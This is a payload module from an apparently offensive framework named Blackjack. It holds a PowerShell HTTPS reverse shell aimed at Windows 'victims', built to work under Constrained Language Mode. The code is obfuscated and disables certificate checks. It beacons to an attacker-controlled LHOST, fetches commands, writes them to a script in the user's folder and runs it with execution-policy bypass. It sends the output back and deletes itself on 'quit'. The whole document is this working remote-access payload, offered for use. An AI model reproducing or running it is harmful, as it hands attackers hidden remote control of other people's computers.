# This module is part of the Blackjack framework

class Payload:

    info = {
        'Title' : 'Windows PowerShell outfile BlackJack https - Constraint Language Mode',
        'Author' : 'Rojahs Montari (r0jahsm0ntar1)',
        'Description' : 'An Https based beacon-like reverse shell that writes and executes commands from disc and will work even if Constraint Language Mode is enabled on the victim',
        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework', 'https://revshells.com']
    }

    meta = {
        'handler' : 'blackjack',
        'type' : 'ps-outfile-cm-ssl',
        'os' : 'windows',
        'shell' : 'powershell.exe'
    }

    config = {
        'frequency' : 15,
        'outfile' : "C:\\Users\\$env:USERNAME\\.local\\africs.ps1"
    }

    parameters = {
        'lhost' : None
    }

    attrs = {
        'obfuscate' : False,
        'encode' : True
    }

    data = '''& ([string]::join('', ( (97,100,100,45,116,121,112,101) |%{;$($_)}|%{ ( [char][int] $_)})) |%{;$_}| % {$_}) @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = & (("svlrf0zWLR36H8tgG4dO12Bjem-PapIEMwnVDiChy5JocNTZQ9AFkUYKxbSuXq7")[45,24,33,26,19,57,23,24,44,14] -join '') TrustAllCertsPolicy
$ConfirmPreference="None";$s=\'*LHOST*\';$i=\'*SESSIONID*\';$p=\'https://\';$v=& (("-GEkcuTjs7JA1640mdPgxUN3DK9VvfeaqpXRYIMhow5WyFCBtbi2ZS8QHrlOLzn")[37,62,28,40,3,30,0,35,30,8,48,38,30,48,39,40,17] -join '') -UseBasicParsing -Uri $p$s/*VERIFY*/$env:COMPUTERNAME/$env:USERNAME -Headers @{"*BLACKJACKID*"=$i};for (;;){$c=(& (("-GEkcuTjs7JA1640mdPgxUN3DK9VvfeaqpXRYIMhow5WyFCBtbi2ZS8QHrlOLzn")[37,62,28,40,3,30,0,35,30,8,48,38,30,48,39,40,17] -join '') -UseBasicParsing -Uri $p$s/*GETCMD* -Headers @{"*BLACKJACKID*"=$i});if (!(@(\'None\',\'quit\') -contains $c)) {& (("NFAM3OihzpkgCBZS-UradLelKsE8TnQ62tcYWfx7Hw5uPvbV09qoJyX4GDImRj1")[36,18,6,33,22,16,5,43,33,9,43,33] -join '') "$c" |%{;$($_)}| & (("n-BPXxbfGCME0NrKjZwvSOgTD2LpUhWJYulqy1szaVikHF6847oQmtIc35ARde9")[50,33,53,1,7,42,34,61] -join '') -filepath *OUTFILE*;$r=powershell -ep bypass *OUTFILE* -ErrorAction Stop -ErrorVariable e;$r=& ([string]::join('', ( (79,117,116,45,83,116,114,105,110,103) |%{;$_}|%{ ( [char][int] $($_))})) |%{;$_}| % {$_}) -InputObject $r;$x=& (("-GEkcuTjs7JA1640mdPgxUN3DK9VvfeaqpXRYIMhow5WyFCBtbi2ZS8QHrlOLzn")[37,62,28,40,3,30,0,35,30,8,48,38,30,48,39,40,17] -join '') -Uri $p$s/*POSTRES* -Method POST -Headers @{"*BLACKJACKID*"=$i} -Body ($e+$r)} elseif ($c -eq \'quit\') {& (("AbIE8owhDd-VO1LzRpHuTYG6r2CN4aj5y0vUSWfnmX3gPxtcsJi7kBFq9QelMZK")[16,58,40,5,34,58,10,2,46,58,40] -join '') *OUTFILE*;& (("Z2mpC4YHdGckzO15q7EnvXFK6D98y-SPoshgVNrIfQRxLjbitlT3BaJUweMAW0u")[30,48,32,3,29,31,38,32,10,57,33,33] -join '') $PID} sleep *FREQ*}'''
